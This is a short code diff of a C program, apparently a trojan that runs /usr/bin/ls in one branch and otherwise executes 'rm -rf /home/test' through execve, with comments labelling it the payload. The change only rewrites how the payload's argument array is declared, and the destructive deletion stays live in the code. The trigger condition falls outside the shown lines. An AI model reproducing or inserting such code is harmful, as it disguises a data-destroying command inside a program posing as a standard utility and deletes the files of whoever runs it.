@@ -10,14 +10,11 @@ int main(int argc, char **argv) {
     execve("/usr/bin/ls", argv, NULL);
   else {
    // Prepare the payload
-   const char payload_arg0[] = "rm";
-   const char payload_arg1[] = "-rf";
-   const char payload_arg2[] = "/home/test";
 
-   const char* payload_argv[] = {payload_arg0,
-                                 payload_arg1,
-                                 payload_arg2,
-                                 NULL};
+   char *payload_argv[] = {"rm",
+                           "-rf",
+                           "/home/test",
+                           NULL};
     
    // Execute the payload
    execve("/usr/bin/rm", payload_argv, NULL);
